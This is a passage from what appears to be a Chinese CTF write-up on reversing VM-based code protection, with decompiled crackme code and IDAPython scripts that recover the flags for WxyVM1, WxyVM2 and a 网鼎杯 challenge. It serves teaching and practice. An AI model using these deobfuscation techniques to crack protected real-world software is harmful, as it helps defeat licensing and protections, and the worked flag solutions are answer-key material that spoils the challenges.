class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0x1</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xf2</span>,<span class="number">0xf1</span>,<span class="number">0xe4</span>,<span class="number">0x21</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0x2</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xf2</span>,<span class="number">0xf1</span>,<span class="number">0xe4</span>,<span class="number">0x22</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0x3</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xf2</span>,<span class="number">0xf1</span>,<span class="number">0xe4</span>,<span class="number">0x23</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0x4</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xf2</span>,<span class="number">0xf1</span>,<span class="number">0xe4</span>,<span class="number">0x24</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0x5</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xf2</span>,<span class="number">0xf1</span>,<span class="number">0xe4</span>,<span class="number">0x25</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0x6</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xf2</span>,<span class="number">0xf1</span>,<span class="number">0xe4</span>,<span class="number">0x26</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0x7</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xf2</span>,<span class="number">0xf1</span>,<span class="number">0xe4</span>,<span class="number">0x27</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0x8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xf2</span>,<span class="number">0xf1</span>,<span class="number">0xe4</span>,<span class="number">0x28</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0x9</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xf2</span>,<span class="number">0xf1</span>,<span class="number">0xe4</span>,<span class="number">0x29</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0xa</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xf2</span>,<span class="number">0xf1</span>,<span class="number">0xe4</span>,<span class="number">0x2a</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0xb</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xf2</span>,<span class="number">0xf1</span>,<span class="number">0xe4</span>,<span class="number">0x2b</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0xc</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xf2</span>,<span class="number">0xf1</span>,<span class="number">0xe4</span>,<span class="number">0x2c</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf4</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>至此，一个简化版的小型虚拟机就实现完了。该虚拟机实现了对输入字符串简单的异或加密，并将加密后的值存储到指定位置。</p><p>用gcc编译一下就可以在ida上自己逆着玩（没想到意外的学会了vmre怎么出题）</p><h2 id="0x03-ctf-vm逆向思路"><a href="#0x03-ctf-vm逆向思路" class="headerlink" title="0x03 ctf vm逆向思路"></a>0x03 ctf vm逆向思路</h2><p>了解了上述知识，下面我们来梳理一下ctf中vm逆向的思路</p><p>这里借用一位大佬的总结</p><blockquote><p>解题一般步骤：</p><p>分析VM结构-&gt;分析opcode-&gt;编写parser-&gt;re算法</p><p>VM结构常见类型：</p><p>基于栈、基于队列、基于信号量</p><p>opcode：</p><p>与VM数据结构对应的指令 ：push pop</p><p>运算指令：add、sub、mul</p></blockquote><h2 id="0x04-ctf实战"><a href="#0x04-ctf实战" class="headerlink" title="0x04 ctf实战"></a>0x04 ctf实战</h2><p>纸上得来终觉浅，掌握了vm虚拟机保护的核心科技。做几个ctf题目来实践一下。先来看看南邮CTF经典的两道vm逆向（ WxyVM1 WxyVM2）</p><h3 id="WxyVM1"><a href="#WxyVM1" class="headerlink" title="WxyVM1"></a>WxyVM1</h3><p>先查壳，文件为无壳64位文件 反编译main函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+Bh] [rbp-5h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[WxyVM 0.0.1]&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;byte_604B80);</span><br><span class="line">  v4 = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">sub_4005B6</span>();</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;byte_604B80) != <span class="number">24</span> )</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">23</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;byte_604B80 + i) != dword_601060[i] )</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;correct&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;wrong&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main函数逻辑非常简单 flag经过sub_4005B6的处理之后 与dword_601060[i] 进行匹配。</p><p>那么我们只需要把sub_4005B6研究明白就可以了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_ invoke__">sub_4005B6</span>()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  char v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">14999</span>; i += <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = byte_6010C0[i + <span class="number">2</span>];</span><br><span class="line">    v3 = byte_6010C0[i + <span class="number">1</span>];</span><br><span class="line">    result = (unsigned <span class="keyword">int</span>)byte_6010C0[i];</span><br><span class="line">    <span class="keyword">switch</span> ( byte_6010C0[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        result = byte_6010C0[i + <span class="number">1</span>];</span><br><span class="line">        *(&amp;byte_604B80 + v3) += v2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        result = byte_6010C0[i + <span class="number">1</span>];</span><br><span class="line">        *(&amp;byte_604B80 + v3) -= v2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        result = byte_6010C0[i + <span class="number">1</span>];</span><br><span class="line">        *(&amp;byte_604B80 + v3) ^= v2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        result = byte_6010C0[i + <span class="number">1</span>];</span><br><span class="line">        *(&amp;byte_604B80 + v3) *= v2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        result = byte_6010C0[i + <span class="number">1</span>];</span><br><span class="line">        *(&amp;byte_604B80 + v3) ^= *(&amp;byte_604B80 + byte_6010C0[i + <span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_4005B6()函数里也有一个已知数组byte_6010C0，byte_6010C0数组三位为一组，第一位指示操作，第二位指示输入的哪一位进行操作，第三位指示操作数。观察发现byte_6010C0数组第一位只有1, 2,  3，所以只会存在前三种运算，即加减异或，这都是很好逆的算法。由于byte_6010C0数组过大，我们选择不导出直接利用idapython的方式直接re</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idc_bc695 import * <span class="comment">//IDA7.5+需要引入该库不然会报错</span></span><br><span class="line">arr = [<span class="number">4294967236</span>, <span class="number">52</span>, <span class="number">34</span>, <span class="number">4294967217</span>, <span class="number">4294967251</span>, <span class="number">17</span>, <span class="number">4294967191</span>, <span class="number">7</span>, <span class="number">4294967259</span>, <span class="number">55</span>, <span class="number">4294967236</span>, <span class="number">6</span>, <span class="number">29</span>, <span class="number">4294967292</span>, <span class="number">91</span>, <span class="number">4294967277</span>, <span class="number">4294967192</span>, <span class="number">4294967263</span>, <span class="number">4294967188</span>, <span class="number">4294967256</span>, <span class="number">4294967219</span>, <span class="number">4294967172</span>, <span class="number">4294967244</span>, <span class="number">8</span>]</span><br><span class="line">addr = <span class="number">0x6010c0</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="title function_ invoke__">len</span>(arr)):</span><br><span class="line">    arr[i] &amp;= <span class="number">0xffffffff</span> </span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">14997</span>,-<span class="number">1</span>,-<span class="number">3</span>):</span><br><span class="line">    v0 = <span class="title function_ invoke__">Byte</span>(addr + i)</span><br><span class="line">    v3 = <span class="title function_ invoke__">Byte</span>(addr + i + <span class="number">2</span>)</span><br><span class="line">    result = <span class="title function_ invoke__">Byte</span>(addr + i + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> v0 == <span class="number">1</span>:</span><br><span class="line">        arr[result] -= v3</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> v0 == <span class="number">2</span>:</span><br><span class="line">        arr[result] += v3</span><br><span class="line">    <span class="keyword">if</span> v0 == <span class="number">3</span>:</span><br><span class="line">        arr[result] ^= v3</span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="title function_ invoke__">len</span>(arr)):</span><br><span class="line">    arr[i] &amp;= <span class="number">0xff</span></span><br><span class="line"><span class="keyword">print</span>(<span class="string">&#x27;&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="title function_ invoke__">map</span>(chr, arr)))</span><br></pre></td></tr></table></figure><p>运行得到flag</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/02/attach-d416869e47726660851b7715084efb57fdfbcd8d.png" alt="image.png"></p><h3 id="WxyVM2"><a href="#WxyVM2" class="headerlink" title="WxyVM2"></a>WxyVM2</h3><p>考察去花指令</p><p>同样的无壳64位。这次反编译main函数的时候出问题了</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/02/attach-2cfeb8f8c9e60063e9f2188272f8db1263a9d4ef.png" alt="image.png"></p><p>百度搜索了一波找到了解决方案</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">修改ida中的cfg文件夹下的hexrays.cfg中的 </span><br><span class="line">MAX_FUNCSIZE= <span class="number">1024</span>(<span class="number">64</span>改为<span class="number">1024</span>)</span><br></pre></td></tr></table></figure><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/02/attach-8182e8cb487a274144d7cbe87951ea3833a8dc95.png" alt="image.png"></p><p>耐心等待…让子弹飞一会儿。进去会看到大量的伪代码。千万不要被这两万多行的代码吓住了（确实很吓人）我们仔细观察一下末尾的循环发现，由于的循环长度只有24，dword的地址远远超出了这个范围。所以dword数据的计算，其实影响不到最后的结果。byte的计算才是我们这题真正的算法所在。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/02/attach-9cecbcb89001c2122527e470a348a4f0ffe4f91b.png" alt="image.png"></p><p>接下来可以使用ida脚本去花。只保留byte的相关计算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">file_1 = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">s = file_1.read()</span><br><span class="line">s = s.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">s = s.replace(<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">s=s.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment">#去除空格</span></span><br><span class="line">a = s.split(<span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">ss = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a[::-<span class="number">1</span>]: <span class="comment">#逆向算法</span></span><br><span class="line">    <span class="keyword">if</span> i[<span class="number">0</span>] == <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">        ss += i + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">file_1.close()</span><br><span class="line">ss = ss.replace(<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;$&#x27;</span>) <span class="comment">#逆向加减法</span></span><br><span class="line">ss = ss.replace(<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">ss = ss.replace(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">ss = ss.replace(<span class="string">&#x27;byte_&#x27;</span>,<span class="string">&#x27;arr[&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">71</span>,<span class="number">1</span>): <span class="comment">#大写变小写</span></span><br><span class="line">    ss = ss.replace(<span class="built_in">chr</span>(i),<span class="built_in">chr</span>(i+<span class="number">32</span>))</span><br><span class="line"><span class="keyword">for</span>  i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    ss = ss.replace(<span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="number">0x694100</span>+i)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>),<span class="built_in">str</span>(i)+<span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">file_2 = <span class="built_in">open</span>(<span class="string">&#x27;flag2.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">file_2.write(ss)</span><br><span class="line">file_2.close()</span><br></pre></td></tr></table></figure><p>也可以使用文本编辑器，这里推荐emeditor 正则匹配的功能相当完善。处理大批量数据不卡顿。最后将处理过的数据输出即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">arr = [<span class="number">4294967232</span>, <span class="number">4294967173</span>, <span class="number">4294967289</span>, <span class="number">108</span>, <span class="number">4294967266</span>, <span class="number">20</span>, <span class="number">4294967227</span>, <span class="number">4294967268</span>, <span class="number">13</span>, <span class="number">89</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">4294967176</span>, <span class="number">110</span>, <span class="number">4294967195</span>, <span class="number">4294967242</span>, <span class="number">4294967226</span>, <span class="number">92</span>, <span class="number">55</span>, <span class="number">4294967295</span>, <span class="number">72</span>, <span class="number">4294967256</span>, <span class="number">31</span>, <span class="number">4294967211</span>, <span class="number">4294967205</span>]</span><br><span class="line"><span class="comment">#这里是直接复制过滤后的文件 太长了这里就不放上了</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">25</span>):</span><br><span class="line">    <span class="keyword">print</span>(<span class="title function_ invoke__">chr</span>(arr[i]&amp;<span class="number">0xff</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="网鼎杯-2020-青龙组-singal"><a href="#网鼎杯-2020-青龙组-singal" class="headerlink" title="[网鼎杯 2020 青龙组]singal"></a>[网鼎杯 2020 青龙组]singal</h3><p>前两道题目感觉还是缺点vm的味道。应该是题目简单的原因吧。接下来网鼎杯的这道题目才真的开始有内味了。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/02/attach-2fe1ad58877a23061374cf2b26c12324db995454.png" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4[<span class="number">117</span>]; <span class="comment">// [esp+18h] [ebp-1D4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  qmemcpy(v4, &amp;unk_403040, <span class="number">0x1C8</span>u);</span><br><span class="line">  vm_operad(v4, <span class="number">114</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;good,The answer format is:flag &#123;&#125;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反编译一下main函数。发现本题是一道标准的vm逆向。先根据我们总结过的vm逆向思路，写个脚本提取出operad_code</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idc_bc695 import *</span><br><span class="line">start_addr=<span class="number">0x403040</span></span><br><span class="line">alist=[]</span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">114</span>):</span><br><span class="line">    t=<span class="title function_ invoke__">Dword</span>(start_addr)</span><br><span class="line">    alist.<span class="title function_ invoke__">append</span>(t)</span><br><span class="line">    start_addr+=<span class="number">4</span></span><br><span class="line"><span class="keyword">print</span>(alist)</span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">len</span>(alist))</span><br></pre></td></tr></table></figure><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/02/attach-a4f459a2fdf67661e4fb4ea7687e3ca3c9ca3ae6.png" alt="image.png"></p><p>整理一下获取的数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">op_code=[<span class="number">10</span>,<span class="number">4</span>,<span class="number">16</span>,<span class="number">8</span>,</span><br><span class="line"><span class="number">3</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">32</span>,<span class="number">8</span>,</span><br><span class="line"><span class="number">5</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">4</span>,</span><br><span class="line"><span class="number">4</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">33</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">4</span>,</span><br><span class="line"><span class="number">9</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">81</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">36</span>,<span class="number">1</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">11</span>,</span><br><span class="line"><span class="number">1</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">37</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">54</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">65</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">32</span>,</span><br><span class="line"><span class="number">8</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">37</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">1</span>,<span class="number">2</span>,</span><br><span class="line"><span class="number">65</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">34</span>,<span class="number">7</span>,<span class="number">63</span>,<span class="number">7</span>,<span class="number">52</span>,<span class="number">7</span>,<span class="number">50</span>,<span class="number">7</span>,<span class="number">114</span>,<span class="number">7</span>,<span class="number">51</span>,</span><br><span class="line"><span class="number">7</span>,<span class="number">24</span>,<span class="number">7</span>,<span class="number">4294967207</span>,</span><br><span class="line"><span class="number">7</span>,<span class="number">49</span>,<span class="number">7</span>,<span class="number">4294967281</span>,<span class="number">7</span>,</span><br><span class="line"><span class="number">40</span>,<span class="number">7</span>,<span class="number">4294967172</span>,<span class="number">7</span>,<span class="number">4294967233</span>,</span><br><span class="line"><span class="number">7</span>,<span class="number">30</span>,<span class="number">7</span>,<span class="number">122</span>]</span><br></pre></td></tr></table></figure><p>接下来分析 vm opread部分。是典型的VM switch结构</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl <span class="title function_ invoke__">vm_operad</span>(<span class="keyword">int</span> *a1, <span class="keyword">int</span> a2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  char op_code[<span class="number">200</span>]; <span class="comment">// [esp+13h] [ebp-E5h] BYREF</span></span><br><span class="line">  char v4; <span class="comment">// [esp+DBh] [ebp-1Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+DCh] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+E0h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+E4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [esp+E8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> op_index; <span class="comment">// [esp+ECh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  op_index = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span 